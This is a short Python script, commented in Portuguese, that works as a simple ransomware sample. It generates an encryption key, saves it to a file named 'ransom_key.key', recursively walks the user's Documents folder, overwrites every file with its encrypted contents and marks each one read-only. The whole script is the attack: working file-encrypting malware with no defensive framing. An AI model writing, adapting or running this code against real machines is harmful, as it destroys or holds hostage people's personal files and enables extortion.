import os  # Importa o módulo os para interagir com o sistema operacional
from cryptography.fernet import Fernet 

# Gera a chave
def generate_key():
    return Fernet.generate_key()

# Função para encriptar um arquivo
def encrypt_file(filename, key):
    fernet = Fernet(key)  # Inicializa um objeto Fernet com a chave fornecida
    # Lê os dados do arquivo original, encripta os dados e escreve os dados encriptados de volta no arquivo
    with open(filename, "rb") as file:
        original_data = file.read()  
    encrypted_data = fernet.encrypt(original_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)  

# Função para encriptar todos os arquivos na diretoria documents
def encrypt_documents_directory():
    key = generate_key()  # Gera a chave 
    with open("ransom_key.key", "wb") as key_file:
        key_file.write(key)  # Guarda a chave num file
    documents_directory = os.path.join(os.path.expanduser("~"), "Documents")  # Obtém o caminho para documents
    # Percorre recursivamente a diretoria
    for root, dirs, files in os.walk(documents_directory):
        for file in files:
            file_path = os.path.join(root, file)  # Obtém o caminho completo do arquivo
            encrypt_file(file_path, key)  # Encripta o arquivo
            # Define as permissões do arquivo como somente leitura para o usuário
            os.chmod(file_path, 0o444)  # 0o444 representa permissões de leitura para todos os usuários
